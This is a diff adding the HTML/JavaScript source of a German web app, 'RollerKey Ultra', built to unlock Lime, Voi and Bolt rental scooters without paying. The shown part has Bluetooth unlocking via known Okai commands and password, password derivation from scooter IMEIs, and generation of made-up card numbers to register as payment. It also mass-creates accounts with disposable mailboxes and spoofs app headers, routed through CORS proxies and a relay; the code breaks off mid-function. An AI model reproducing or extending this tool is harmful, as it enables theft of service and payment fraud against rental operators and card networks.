@@ -1,0 +1,2676 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black">
+<meta name="theme-color" content="#000000">
+<title>RollerKey Ultra</title>
+<link rel="manifest" href="manifest.json">
+<link rel="icon" href="icon.svg">
+<link rel="apple-touch-icon" href="icon.svg">
+<style>
+*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+html{touch-action:manipulation;-webkit-text-size-adjust:100%;overscroll-behavior:none}
+html,body{margin:0;padding:0;background:#000;color:#ffd24a;
+  font:16px/1.5 ui-monospace,SFMono-Regular,Menlo,monospace}
+body{padding:14px 14px 56px;max-width:680px;margin:0 auto;touch-action:pan-y}
+.kopf{display:flex;align-items:center;gap:10px;margin:0 0 12px}
+#punkt{width:11px;height:11px;border-radius:50%;background:#2e2408;border:1px solid #6b561a;flex:none}
+#punkt.on{background:#ffd24a;border-color:#ffd24a;box-shadow:0 0 10px #ffd24a}
+.kopf h1{font-size:15px;letter-spacing:.2em;margin:0;flex:1;font-weight:700;color:#ffe9a8}
+#marke{font-size:11px;letter-spacing:.14em;padding:5px 9px;border-radius:7px;
+  border:1px solid #4a3a10;color:#a8883a}
+#status{margin:0 0 12px;font-size:14px;color:#a8883a;min-height:40px}
+#status.ok{color:#ffd24a}#status.warn{color:#ff9f43}#status.err{color:#ff5c5c}
+section{border:1px solid #3d300d;border-radius:14px;padding:14px;margin:0 0 12px;background:#0b0902}
+h2{font-size:12px;letter-spacing:.2em;color:#a8883a;margin:0 0 12px;font-weight:700}
+.row{display:flex;justify-content:space-between;gap:12px;font-size:15px;padding:8px 0;
+  border-bottom:1px dotted #3d300d}
+.row:last-of-type{border-bottom:0}
+.row span{color:#a8883a}
+.row b{color:#ffd24a;font-weight:600;text-align:right;word-break:break-all}
+.grid{display:grid;grid-template-columns:1fr 1fr;gap:9px;margin-top:12px}
+button{font:inherit;font-size:14px;font-weight:600;letter-spacing:.1em;padding:15px 8px;
+  border-radius:11px;background:#161203;color:#ffd24a;border:1px solid #3d300d;cursor:pointer;
+  touch-action:manipulation}
+button:active{background:#241d05}
+button:disabled{opacity:.3}
+button.wide{grid-column:1/-1}
+button.big{padding:24px 8px;font-size:17px;letter-spacing:.2em;border-color:#a8883a}
+button.gold{background:#3a2c05;border-color:#ffd24a;color:#ffe9a8}
+button.danger{color:#ffa0a0;border-color:#5c1414;background:#1a0404}
+button.an{border-color:#ffd24a;background:#241d05;color:#ffe9a8}
+input,select,textarea{width:100%;font:inherit;font-size:15px;padding:13px;border-radius:11px;
+  background:#0b0902;color:#ffd24a;border:1px solid #3d300d;margin-top:9px}
+input::placeholder,textarea::placeholder{color:#6b561a}
+#log{font-size:12px;line-height:1.55;height:170px;overflow:auto;background:#070501;
+  border:1px solid #3d300d;border-radius:10px;padding:9px;white-space:pre-wrap;
+  word-break:break-all;-webkit-overflow-scrolling:touch}
+#log div{color:#a8883a}
+#log div.g{color:#ffd24a}
+#log div.y{color:#ff9f43}
+#log div.e{color:#ff5c5c}
+#log div.h{color:#ffe9a8}
+.hint{font-size:12.5px;color:#a8883a;margin-top:11px;line-height:1.55}
+.hint b{color:#ff9f43;font-weight:600}
+video{width:100%;border-radius:10px;margin-top:10px;background:#000;display:none}
+#qrbox{font-size:12.5px;color:#a8883a;margin-top:10px;word-break:break-all;min-height:14px}
+#bt{font-size:14px;margin-top:10px;color:#a8883a}
+#bt.on{color:#ffd24a}
+hr{border:0;border-top:1px dotted #3d300d;margin:14px 0}
+.brands{display:flex;gap:8px;margin-top:12px}
+.brands button{flex:1;padding:12px 4px;font-size:13px;opacity:.45}
+.brands button.on{opacity:1;border-color:#ffd24a;background:#241d05}
+.card{position:relative;border-radius:18px;padding:18px;margin-top:12px;overflow:hidden;
+  background:radial-gradient(120% 90% at 88% 6%,rgba(255,210,74,.2),transparent 58%),linear-gradient(140deg,#3a2c05 0%,#0b0902 46%,#4a3a10 100%);
+  border:1px solid #a8883a;box-shadow:0 8px 24px rgba(0,0,0,.7)}
+.card::after{content:"";position:absolute;inset:0;pointer-events:none;
+  background:repeating-linear-gradient(115deg,transparent 0 22px,rgba(255,210,74,.05) 22px 23px)}
+.card.off{opacity:.4;filter:saturate(.4)}
+.crow{display:flex;align-items:center;justify-content:space-between}
+.chip{width:38px;height:28px;border-radius:6px;background:linear-gradient(135deg,#ffe9a8,#a8883a 55%,#ffd24a)}
+.brand{font-style:italic;font-weight:700;letter-spacing:.16em;font-size:16px;color:#ffe9a8}
+.cnum{margin:18px 0 14px;font-size:17px;letter-spacing:.14em;color:#fff4cf;word-spacing:.3em}
+.cfoot{display:flex;justify-content:space-between;align-items:flex-end;gap:8px}
+.clab{font-size:11px;letter-spacing:.14em;color:#a8883a}
+.cval{font-size:13px;color:#ffe9a8;margin-top:2px}
+.camt{text-align:right}
+.camt .cval{font-size:17px;color:#ffd24a}
+.cnrow{margin-top:11px;border-top:1px dotted #4a3a10;padding-top:9px}
+.cnrow .cval{font-size:15px;letter-spacing:.05em;color:#fff4cf}
+#karteText{font-size:13px;min-height:112px;color:#ffe9a8;line-height:1.7}
+#cStat{font-size:13px;margin-top:10px;color:#a8883a;min-height:34px;line-height:1.5}
+#cStat.g{color:#ffd24a}#cStat.e{color:#ff5c5c}#cStat.y{color:#ff9f43}
+.ride{border:1px dashed #3d300d;border-radius:12px;padding:14px;background:#070501}
+.rtime{font-size:44px;letter-spacing:.06em;color:#6b561a;text-align:center;
+  font-variant-numeric:tabular-nums;font-weight:700}
+.rtime.on{color:#ffd24a}
+.rgrid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:12px;text-align:center}
+.rval{font-size:16px;color:#ffe9a8;margin-top:2px;font-weight:600}
+.ampel{border:1px solid #3d300d;border-radius:12px;padding:12px;background:#070501;font-size:13px;line-height:1.6}
+.ampel div{display:flex;justify-content:space-between;gap:10px;padding:3px 0}
+.ampel i{font-style:normal;color:#a8883a}
+.ampel b{color:#6b561a;font-weight:600}
+.ampel b.ok{color:#ffd24a}
+.ampel b.no{color:#ff5c5c}
+.ampel b.war{color:#ff9f43}
+details{margin-top:12px;border-top:1px dotted #3d300d;padding-top:12px}
+summary{font-size:13px;letter-spacing:.12em;color:#a8883a;cursor:pointer;list-style:none;font-weight:600}
+summary::-webkit-details-marker{display:none}
+summary::before{content:"+ ";color:#ffd24a}
+details[open] summary::before{content:"− "}
+</style>
+</head>
+<body>
+
+<div class="kopf">
+  <div id="punkt"></div>
+  <h1>ROLLERKEY ULTRA</h1>
+  <div id="marke">LIME</div>
+</div>
+<div id="status">startet …</div>
+
+<section>
+  <h2>ROLLER</h2>
+  <div id="bt">nicht verbunden</div>
+  <div class="row"><span>Akku</span><b id="vAkku">–</b></div>
+  <div class="row"><span>Tempo</span><b id="vTempo">–</b></div>
+  <div class="row"><span>Bauart</span><b id="vFam">–</b></div>
+  <div class="brands">
+    <button data-b="lime" class="on">LIME</button>
+    <button data-b="voi">VOI</button>
+    <button data-b="bolt">BOLT</button>
+  </div>
+  <div class="grid">
+    <button class="wide" id="bScan">QR SCANNEN</button>
+    <button class="wide an" id="bAuto">AUTO AN · SCANNEN ENTSPERRT</button>
+    <button id="bTorch">LICHT</button>
+    <input id="iPlate" placeholder="Nummer vom Lenker" autocapitalize="characters" maxlength="12">
+    <button id="bPlate">NUMMER NEHMEN</button>
+    <button class="wide" id="bConn">VERBINDEN</button>
+    <button class="wide big" id="bUnlock">ENTSPERREN</button>
+    <button class="wide" id="bApiUn">OHNE BLUETOOTH</button>
+    <button id="bLock">SPERREN</button>
+    <button id="bDiag">DIAGNOSE</button>
+    <button class="wide" id="bQrCopy">CODE KOPIEREN</button>
+  </div>
+  <video id="cam" playsinline muted></video>
+  <div id="qrbox"></div>
+  <div class="hint">Mit <b>AUTO</b> reicht ein Scan: Konto, Karte, Standardzahlweg und Entsperrung laufen von selbst. Ohne AUTO passiert erst beim Drücken von ENTSPERREN etwas.</div>
+  <details>
+    <summary>WELCHE METHODE</summary>
+    <div class="hint">
+      <b>Bluetooth</b> braucht kein Konto und keine Karte. Bei Lime sind die Rahmen bekannt, bei Voi und Bolt läuft es über Okai im Klartext.<br><br>
+      <b>Ohne Bluetooth</b> braucht Konto und Standardzahlweg. Läuft automatisch, wenn du entsperrst.<br><br>
+      <b>Karte im Anbieter</b> ist der Notausgang. Lime nimmt Stripe, Voi prüft über Braintree und ist am strengsten.
+    </div>
+  </details>
+</section>
+
+<section>
+  <h2>FAHRT</h2>
+  <div class="ride">
+    <div class="rtime" id="rTime">00:00</div>
+    <div class="rgrid">
+      <div><div class="clab">REST</div><div class="rval" id="rRest">50,00 €</div></div>
+      <div><div class="clab">VERBRAUCHT</div><div class="rval" id="rUsed">0,00 €</div></div>
+    </div>
+    <div class="grid">
+      <button id="bRideStop">BEENDEN</button>
+      <button id="bRideReset">NULLEN</button>
+    </div>
+  </div>
+  <div class="hint">Läuft beim Entsperren los, stoppt beim Sperren. Hält den Roller alle 45 s wach.</div>
+</section>
+
+<section>
+  <h2>KONTO</h2>
+  <div class="row"><span>Mail</span><b id="uMail">–</b></div>
+  <div class="row"><span>Guthaben</span><b id="uBal">–</b></div>
+  <div class="row"><span>Zustand</span><b id="uState">–</b></div>
+  <div class="grid">
+    <button id="bNew">NEUES KONTO</button>
+    <button id="bBal">PRÜFEN</button>
+    <button id="bCode">CODES</button>
+    <button id="bDrop" class="danger">LÖSCHEN</button>
+  </div>
+  <details id="manual">
+    <summary>EIGENE MAIL / LINK</summary>
+    <input id="iOwn" type="email" inputmode="email" placeholder="deine@mail.de" autocomplete="email">
+    <button class="wide" id="bOwn" style="margin-top:10px">LINK ANFORDERN</button>
+    <textarea id="iLink" placeholder="Link aus der Mail hier einfügen" style="min-height:70px"></textarea>
+    <button class="wide" id="bLink" style="margin-top:10px">LINK EINLÖSEN</button>
+    <div class="hint">Mail antippen, Link kopieren, hier einfügen. Bei Voi ist das der einzige Weg.</div>
+  </details>
+  <details id="secPhone">
+    <summary>TELEFON</summary>
+    <input id="iPhone" type="tel" inputmode="tel" placeholder="+49 151 2345678" autocomplete="tel">
+    <div class="grid">
+      <button id="bOtp">CODE SENDEN</button>
+      <button id="bOtp2">CODE PRÜFEN</button>
+    </div>
+    <input id="iOtp" inputmode="numeric" maxlength="6" placeholder="SMS-Code">
+    <div class="hint">Bolt braucht diesen Weg.</div>
+  </details>
+</section>
+
+<section>
+  <h2>ZAHLWEG</h2>
+  <div class="ampel" id="ampel">
+    <div><i>Karte hinterlegt</i><b id="vDef">–</b></div>
+    <div><i>Standardzahlweg</i><b id="vStd">–</b></div>
+    <div><i>Guthaben</i><b id="vWal">–</b></div>
+    <div><i>Startblocker</i><b id="vBlock">–</b></div>
+    <div><i>Tarif vor Ort</i><b id="vRate">–</b></div>
+  </div>
+  <div class="grid">
+    <button class="wide gold" id="bPre">ZAHLWEG PRÜFEN</button>
+    <button id="bDef">ALS STANDARD</button>
+    <button id="bRing">Klingeln</button>
+  </div>
+  <div class="hint">Ohne Standardzahlweg gibt Lime nicht frei. <b>Erst prüfen, dann entsperren.</b></div>
+</section>
+
+<section>
+  <h2>KARTE</h2>
+  <div class="card off" id="cardBox">
+    <div class="crow"><span class="chip"></span><span class="brand" id="cBrand">VISA</span></div>
+    <div class="cnum" id="cNum">•••• •••• •••• ••••</div>
+    <div class="cfoot">
+      <div><div class="clab">GÜLTIG</div><div class="cval" id="cExp">--/--</div></div>
+      <div><div class="clab">CVC</div><div class="cval" id="cCvc">---</div></div>
+      <div class="camt"><div class="clab">REST</div><div class="cval" id="cAmt">50,00 €</div></div>
+    </div>
+    <div class="cnrow"><div class="clab">INHABER</div><div class="cval" id="cName">RIDER</div></div>
+  </div>
+  <div id="cStat"></div>
+  <div class="grid">
+    <button id="bNew2">WÜRFELN</button>
+    <button id="bTest">PRÜFEN</button>
+    <button id="bHunt">BIN-SUCHE</button>
+    <button id="bCopyNum">KOPIEREN</button>
+    <button class="wide" id="bCopyAll">ALLES KOPIEREN</button>
+    <button class="wide" id="bUse">HINTERLEGEN</button>
+    <button class="wide" id="bDel">ENTFERNEN</button>
+  </div>
+  <details>
+    <summary>ABTIPPEN</summary>
+    <textarea id="karteText" readonly spellcheck="false"></textarea>
+    <div class="hint"><b>BIN</b> sind die ersten sechs Stellen der Nummer, die bestimmen die Bank. <b>CVC</b> sind drei Ziffern, die sind beliebig. Voi will den vollen Namen, nicht das Kürzel.</div>
+  </details>
+  <details>
+    <summary>ECHTE KARTE</summary>
+    <input id="iNum" inputmode="numeric" placeholder="Kartennummer" autocomplete="cc-number">
+    <div class="grid">
+      <input id="iExp" inputmode="numeric" placeholder="MM/JJ" maxlength="5" autocomplete="cc-exp">
+      <input id="iCvc" inputmode="numeric" placeholder="CVC" maxlength="4" autocomplete="cc-csc">
+    </div>
+    <input id="iName" placeholder="Name" autocomplete="cc-name">
+    <button class="wide" id="bTake" style="margin-top:10px">ÜBERNEHMEN</button>
+  </details>
+</section>
+
+<section>
+  <h2>KONSOLE</h2>
+  <div id="log"></div>
+  <div class="grid">
+    <button id="bCopy">KOPIEREN</button>
+    <button id="bClear">LEEREN</button>
+  </div>
+</section>
+
+<section>
+  <h2>WARTUNG</h2>
+  <div class="grid">
+    <button id="bRelay">NETZ TESTEN</button>
+    <button id="bReset" class="danger">ZURÜCKSETZEN</button>
+  </div>
+  <details>
+    <summary>ERWEITERT</summary>
+    <input id="iPk" placeholder="Stripe-Schlüssel pk_live_…">
+    <button class="wide" id="bPk" style="margin-top:10px">SPEICHERN</button>
+    <input id="iBin" placeholder="eigene BIN (6 Stellen)" inputmode="numeric" maxlength="6">
+    <button class="wide" id="bBin" style="margin-top:10px">BIN SETZEN</button>
+    <hr>
+    <span class="hint">Schreibmodus. Nur bei Fehlern umstellen.</span>
+    <select id="iModus">
+      <option value="auto">automatisch</option>
+      <option value="resp">mit Antwort</option>
+      <option value="noresp">ohne Antwort</option>
+    </select>
+    <hr>
+    <span class="hint">Kanal. Nur umstellen, wenn die Diagnose mehrere zeigt.</span>
+    <select id="iKanal"><option value="">automatisch</option></select>
+    <hr>
+    <span class="hint">Bauart. Automatisch heißt: am Gerät ausprobiert.</span>
+    <select id="iFam">
+      <option value="">automatisch</option>
+      <option value="okai">Okai (AT)</option>
+      <option value="lime">Lime (binär)</option>
+      <option value="ninebot">Ninebot</option>
+    </select>
+    <hr>
+    <span class="hint">IMEI (15 Ziffern) vom Aufkleber. Daraus rechnet die App das Anmeldepasswort.</span>
+    <input id="iImei" placeholder="IMEI, 15 Ziffern" inputmode="numeric" maxlength="15">
+    <div class="grid">
+      <button id="bImei">PASSWORT RECHNEN</button>
+      <button id="bAuth">ANMELDEN</button>
+    </div>
+    <div id="pwAus" class="hint"></div>
+    <hr>
+    <span class="hint">Postfach-Anbieter. Automatisch heißt: durchprobieren.</span>
+    <select id="iFach">
+      <option value="">automatisch</option>
+      <option value="catchmail">catchmail</option>
+      <option value="mail.tm">mail.tm</option>
+      <option value="mail.gw">mail.gw</option>
+      <option value="guerrilla">guerrilla</option>
+    </select>
+    <button class="wide" id="bFachNeu">NEUES POSTFACH</button>
+    <hr>
+    <span class="hint"><b>Relay.</b> Steht bereits drin. Nur ändern, wenn nötig.</span>
+    <input id="iRelay" placeholder="https://relay.name.workers.dev/?url=" autocapitalize="off">
+    <div class="grid">
+      <button id="bSaveRelay">SPEICHERN</button>
+      <button id="bRelayDel">LÖSCHEN</button>
+      <button class="wide" id="bNet">NETZ TESTEN</button>
+      <button class="wide" id="bFrei">SPERREN AUFHEBEN</button>
+    </div>
+    <button class="wide" id="bCopyW">WORKER-CODE KOPIEREN</button>
+    <textarea id="workerCode" readonly spellcheck="false"></textarea>
+    <hr>
+    <span class="hint">Okai: Testmodus, Sperren, Lesewerte</span>
+    <div class="grid">
+      <button id="bTestOk">TESTMODUS</button>
+      <button id="bOkaiUn">OKSCM 0</button>
+      <button id="bOkaiLk">OKSCM 1</button>
+      <button id="bOkaiBat">OKBCL</button>
+      <button class="wide" id="bShot">ALLES DURCHPROBIEREN</button>
+    </div>
+    <hr>
+    <input id="iAt" placeholder="Passwort (Serie: OKAIYLBT)">
+    <button class="wide" id="bAt" style="margin-top:10px">PASSWORT PRÜFEN</button>
+    <input id="iRaw" placeholder="Rohbefehl (Hex oder ASCII)">
+    <button class="wide" id="bRaw" style="margin-top:10px">ROH SENDEN</button>
+  </details>
+</section>
+
+<script>
+"use strict";
+
+const $ = id => document.getElementById(id);
+const sleep = ms => new Promise(r => setTimeout(r, ms));
+const money = c => (Math.max(0, Math.round(c || 0)) / 100).toFixed(2).replace(".", ",") + " €";
+const kurz = (s, n) => String(s || "").replace(/\s+/g, " ").slice(0, n || 70);
+const err = e => (e && e.message) ? e.message : String(e);
+const tb = s => new TextEncoder().encode(s);
+const buf = b => new Uint8Array(b).buffer;
+const rnd = n => Math.floor(Math.random() * n);
+const enc = encodeURIComponent;
+const J = o => JSON.stringify(o);
+const F = o => new URLSearchParams(o).toString();
+
+const LIMIT = 5000, PREIS_MIN = 0.19;
+const KEEP_MS = 45000, HS_MS = 500, SETTLE_MS = 1200;
+const MAIL_RUNDEN = 6, NET_MS = 18000, MAIL_TAKT = 45;
+const APP_VER = "3.248.1";
+const RELAY_STD = "https://withered-dream-e5b5.timokrell09.workers.dev/?url=";
+
+const S = {
+  busy:false, prov:false, brand:"lime", acct:null, card:null, auto:true, voiKarte:false,
+  konten:{ lime:null, voi:null, bolt:null },
+  pk:{}, bin:"", block:[], gut:"", mail:"", bal:0,
+  dev:null, fam:"lime", chans:[], chan:null, tot:{}, fehler:{}, bremse:0,
+  relay:"", settle:0, hs:0, hsRun:false, notes:0, rx:"",
+  akku:0, tempo:0, offen:false,
+  cam:null, raf:0, torch:false, qr:"", picking:false, lastUn:0, keep:0, keepRun:false,
+  boltSrv:"", boltBasic:"", voiTok:"", def:"",
+  fahrt:{ t0:0, base:0, timer:0, laeuft:false }
+};
+
+const ls = (k, v) => { try { localStorage.setItem("rk_" + k, JSON.stringify(v)) } catch(_){} };
+const lg = (k, d) => { try { const r = localStorage.getItem("rk_" + k); return r === null ? d : JSON.parse(r) } catch(_){ return d } };
+
+const DEVTOK = (() => {
+  let t = lg("devtok", "");
+  if (!t){
+    t = "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, c => {
+      const r = rnd(16), v = c === "x" ? r : (r & 0x3 | 0x8);
+      return v.toString(16);
+    });
+    ls("devtok", t);
+  }
+  return t;
+})();
+
+const KOPF = () => ({
+  "Accept": "application/json",
+  "Accept-Language": "de-DE,de;q=0.9,en;q=0.8",
+  "Platform": "iOS",
+  "App-Version": APP_VER,
+  "X-Device-Token": DEVTOK
+});
+const H = (auth) => {
+  const h = KOPF();
+  h["Content-Type"] = "application/json";
+  if (auth) h.Authorization = "Bearer " + auth;
+  return h;
+};
+const HF = (auth) => {
+  const h = KOPF();
+  h["Content-Type"] = "application/x-www-form-urlencoded";
+  if (auth) h.Authorization = "Bearer " + auth;
+  return h;
+};
+
+function stat(t, c){
+  const el = $("status");
+  el.textContent = t;
+  el.className = c || "";
+}
+function cstat(t, c){ $("cStat").textContent = t || ""; $("cStat").className = c || "" }
+function funkReset(){
+  S.akku = 0; S.tempo = 0; S.rx = "";
+  $("vAkku").textContent = "–"; $("vTempo").textContent = "–"; $("vFam").textContent = "–";
+}
+
+function log(t, c){
+  const d = document.createElement("div");
+  d.className = c || "";
+  const z = new Date().toTimeString().slice(0, 8);
+  d.textContent = z + "  " + t;
+  const box = $("log");
+  box.appendChild(d);
+  while (box.children.length > 400) box.removeChild(box.firstChild);
+  box.scrollTop = box.scrollHeight;
+}
+
+function guard(fn, ms){
+  return async function(){
+    if (S.busy) return;
+    S.busy = true; paint();
+    let fertig = false;
+    const wd = setTimeout(() => {
+      if (fertig) return;
+      S.busy = false; paint();
+      stat("Zeitüberschreitung.", "err");
+    }, ms || 240000);
+    try { await fn.apply(this, arguments) }
+    catch(e){ log("Fehler: " + err(e), "e"); stat("Fehler: " + err(e), "err") }
+    finally { fertig = true; clearTimeout(wd); S.busy = false; paint() }
+  };
+}
+
+window.addEventListener("error", e => log("JS: " + (e.message || "?"), "e"));
+window.addEventListener("unhandledrejection", e => log("Promise: " + err(e.reason), "e"));
+
+/* ═══════ NETZ ═══════ */
+
+const POSTWEGE = [
+  { n:"corsmirror",  f: u => "https://corsmirror.com/v1?url=" + enc(u) },
+  { n:"allorigins",  f: u => "https://api.allorigins.win/raw?url=" + enc(u) },
+  { n:"codetabs",    f: u => "https://api.codetabs.com/v1/proxy?quest=" + enc(u) },
+  { n:"cors.lol",    f: u => "https://api.cors.lol/?url=" + enc(u) },
+  { n:"x2u",         f: u => "https://cors.x2u.in/" + u },
+  { n:"cf-anywhere", f: u => "https://test.cors.workers.dev/?" + u },
+  { n:"cors.dev",    f: u => "https://proxy.cors.dev/" + u, auth:false }
+];
+const GETWEGE = POSTWEGE.slice();
+
+const CORS_OK = ["api.mail.tm", "api.mail.gw", "api.guerrillamail.com",
+                 "api.stripe.com", "api.catchmail.io", "api.voiapp.io",
+                 "api.braintreegateway.com",
+                 "rental-search.bolt.eu", "user.bolt.eu", "node.bolt.eu"];
+
+const MUELL = /invalid_origin|domain_not_registered|bad gateway|just a moment|access denied|missing_api_key|api key required|not allowed|rate_limit_exceeded|rate limit exceeded/i;
+
+const gesperrt = n => (S.tot[n] || 0) > Date.now();
+const sperre = (n, ms) => { S.tot[n] = Date.now() + ms };
+
+function daneben(n){
+  S.fehler[n] = (S.fehler[n] || 0) + 1;
+  if (S.fehler[n] >= 2) sperre(n, n === "relay" ? 6000 : 20000);
+}
+function gutGelaufen(n){
+  S.fehler[n] = 0;
+  S.tot[n] = 0;
+  if (S.gut !== n){ S.gut = n; ls("gut", n) }
+}
+
+function sperreDom(dom){
+  if (!dom) return;
+  if (S.block.indexOf(dom) < 0){ S.block.push(dom); ls("block", S.block) }
+}
+
+function wege(post, url, auth){
+  const l = [];
+  let host = "";
+  try { host = new URL(url).hostname } catch(_){}
+  const direkt = { n:"direkt", f: u => u };
+  const eigen = CORS_OK.indexOf(host) >= 0;
+
+  if (S.relay) l.push({ n:"relay", f: u => S.relay + enc(u) });
+  if (eigen) l.push(direkt);
+
+  const liste = (post ? POSTWEGE : GETWEGE).filter(w => !auth || w.auth !== false);
+  const i = liste.findIndex(w => w.n === S.gut);
+  if (i > 0){ const [w] = liste.splice(i, 1); liste.unshift(w) }
+  for (const w of liste) l.push(w);
+
+  if (!eigen) l.push(direkt);
+  return l;
+}
+
+function echt(res, text){
+  const t = (text || "").trim();
+  if (res.status < 400) return true;
+  if ([400, 404, 409, 422].indexOf(res.status) >= 0) return true;
+  if ([401, 403, 405].indexOf(res.status) >= 0){
+    if (/^[\[{]/.test(t)) return true;
+    if (t.length > 250 && !MUELL.test(t)) return true;
+    return false;
+  }
+  return false;
+}
+
+function saub(t){ return kurz(String(t || "").replace(/<[^>]+>/g, " "), 110) }
+
+async function roh(url, o){
+  o = o || {};
+  const post = (o.method || "GET").toUpperCase() !== "GET";
+  const auth = !!(o.headers && o.headers.Authorization);
+  let reihe = wege(post, url, auth);
+
+  if (reihe.every(w => gesperrt(w.n))){
+    S.tot = {}; S.fehler = {};
+    log("alle Wege gesperrt · Sperren aufgehoben", "y");
+    reihe = wege(post, url, auth);
+  }
+
+  let last = null, probiert = 0, letzte429 = null;
+
+  for (const w of reihe){
+    if (gesperrt(w.n)) continue;
+    probiert++;
+    try {
+      const ctl = new AbortController();
+      const t = setTimeout(() => ctl.abort(), o.frist || NET_MS);
+      const res = await fetch(w.f(url), {
+        method: o.method || "GET",
+        headers: o.headers || {},
+        body: o.body,
+        signal: ctl.signal,
+        redirect: "follow",
+        cache: "no-store"
+      });
+      clearTimeout(t);
+      const text = await res.text();
+
+      if (res.status === 429){
+        sperre(w.n, w.n === "relay" ? 8000 : 45000);
+        S.bremse = Date.now() + 5000;
+        letzte429 = { ok:false, status:429, text:text, json:null, weg:w.n };
+        log("Weg " + w.n + " gebremst · 429", "y");
+        continue;
+      }
+
+      const eigenerFehler = (res.status === 502 && /relay_fail/.test(text));
+      const traegt = w.n === "relay"
+        ? !eigenerFehler
+        : (echt(res, text) && !MUELL.test(text.slice(0, 200)));
+
+      if (!traegt){
+        daneben(w.n);
+        log("Weg " + w.n + " taugt nicht · HTTP " + res.status, "y");
+        last = new Error("Weg " + w.n + " taugt nicht");
+        continue;
+      }
+      gutGelaufen(w.n);
+      let json = null;
+      try { json = JSON.parse(text) } catch(_){}
+      return { ok: res.ok, status: res.status, text: text, json: json, weg: w.n };
+    } catch(e){
+      daneben(w.n);
+      log("Weg " + w.n + " · " + kurz(e), "y");
+      last = e;
+    }
+  }
+  if (letzte429) return letzte429;
+  if (!probiert) throw new Error(auth && !S.relay ? "alle Wege gesperrt · RELAY einrichten" : "alle Wege gesperrt");
+  throw last || new Error("Netz nicht erreichbar");
+}
+
+const warten = () => {
+  const ms = Math.max(0, (S.bremse || 0) - Date.now());
+  return ms ? sleep(ms) : Promise.resolve();
+};
+
+/* ═══════ POSTFACH ═══════ */
+
+const CATCH_DOM = ["catchmail.io", "mailistry.com", "zeppost.com"];
+
+async function catchBox(){
+  const doms = CATCH_DOM.filter(d => S.block.indexOf(d) < 0);
+  if (!doms.length) throw new Error("catchmail · alle Domains gesperrt");
+  const adr = "rk" + Date.now().toString(36) + rnd(900) + "@" + doms[rnd(doms.length)];
+  const liste = () => roh("https://api.catchmail.io/api/v1/mailbox?address=" + enc(adr));
+  const probe = await liste();
+  if (!probe.ok) throw new Error("catchmail " + probe.status);
+  return {
+    art:"catchmail", adr:adr, pw:"-", dom:adr.split("@")[1],
+    hole: async () => {
+      const r = await liste();
+      if (!r.ok || !r.json) return "";
+      let out = "";
+      for (const m of (r.json.messages || []).slice(0, 3)){
+        await sleep(1100);
+        const v = await roh("https://api.catchmail.io/api/v1/message/" + enc(m.id) + "?mailbox=" + enc(adr));
+        const b = v.json && v.json.body;
+        out += (b && (b.text || b.html)) || "";
+      }
+      return out;
+    }
+  };
+}
+
+async function tmBox(host){
+  const d = await roh("https://" + host + "/domains");
+  if (!d.ok || !d.json) throw new Error(host + " domains");
+  const doms = (d.json["hydra:member"] || d.json.domains || [])
+    .filter(x => x.isActive !== false && x.domain)
+    .map(x => x.domain)
+    .filter(x => S.block.indexOf(x) < 0);
+  if (!doms.length) throw new Error(host + " keine Domain");
+  const adr = "rk" + Date.now().toString(36) + rnd(900) + "@" + doms[rnd(doms.length)];
+  const pw = "Rk" + Math.random().toString(36).slice(2, 10) + "!9";
+  const a = await roh("https://" + host + "/accounts", {
+    method:"POST", headers:H(null), body:J({ address:adr, password:pw })
+  });
+  if (!a.ok) throw new Error(host + " " + a.status);
+  const t = await roh("https://" + host + "/token", {
+    method:"POST", headers:H(null), body:J({ address:adr, password:pw })
+  });
+  if (!t.ok || !t.json || !t.json.token) throw new Error(host + " token");
+  const tok = t.json.token;
+  return {
+    art: host, adr: adr, pw: pw, dom: adr.split("@")[1],
+    hole: async () => {
+      const r = await roh("https://" + host + "/messages", { headers:H(tok) });
+      if (!r.ok || !r.json) return "";
+      let out = "";
+      for (const m of (r.json["hydra:member"] || []).slice(0, 3)){
+        const v = await roh("https://" + host + "/messages/" + m.id, { headers:H(tok) });
+        out += (v.json && (v.json.text || v.json.html || v.json.intro)) || "";
+      }
+      return out;
+    }
+  };
+}
+
+async function guerrillaBox(){
+  const d = await roh("https://api.guerrillamail.com/ajax.php?f=get_email_address&lang=de");
+  if (!d.ok || !d.json) throw new Error("guerrilla");
+  const adr = d.json.email_addr;
+  const sid = d.json.sid_token;
+  return {
+    art:"guerrilla", adr:adr, pw:"-", dom:adr.split("@")[1],
+    hole: async () => {
+      const r = await roh("https://api.guerrillamail.com/ajax.php?f=check_email&seq=0&sid_token=" + sid);
+      if (!r.ok || !r.json) return "";
+      let out = "";
+      for (const m of (r.json.list || []).slice(0, 3)){
+        const v = await roh("https://api.guerrillamail.com/ajax.php?f=fetch_email&email_id=" + m.mail_id + "&sid_token=" + sid);
+        out += (v.json && (v.json.mail_body || "")) || "";
+      }
+      return out;
+    }
+  };
+}
+
+function raceBox(){
+  const wahl = $("iFach").value;
+  const bau = [];
+  if (wahl === "catchmail") bau.push(catchBox);
+  else if (wahl === "mail.tm") bau.push(() => tmBox("api.mail.tm"));
+  else if (wahl === "mail.gw") bau.push(() => tmBox("api.mail.gw"));
+  else if (wahl === "guerrilla") bau.push(guerrillaBox);
+  else bau.push(catchBox, () => tmBox("api.mail.tm"), () => tmBox("api.mail.gw"), guerrillaBox);
+
+  return new Promise((res, rej) => {
+    let offen = bau.length, fertig = false, letzter = null;
+    bau.forEach((fn, i) => setTimeout(async () => {
+      if (fertig) return;
+      try {
+        const b = await fn();
+        if (fertig) return;
+        fertig = true;
+        log("Postfach " + b.art + " · " + b.adr, "g");
+        res(b);
+      } catch(e){
+        letzter = e;
+        log("Postfach " + (i + 1) + " · " + kurz(e), "y");
+        if (--offen === 0 && !fertig) rej(letzter || new Error("kein Postfach"));
+      }
+    }, i * 300));
+  });
+}
+
+/* ═══════ LIME ═══════ */
+
+function grabToken(t){
+  if (!t) return "";
+  const m = String(t).match(/[?&#](?:token|access_token|magic_link_token|code)=([A-Za-z0-9._\-]{12,})/);
+  return m ? m[1] : "";
+}
+
+async function limeMail(adr){
+  const formen = [
+    { art:"form", d:{ email:adr, user_agreement_version:"4", user_agreement_country_code:"DE" } },
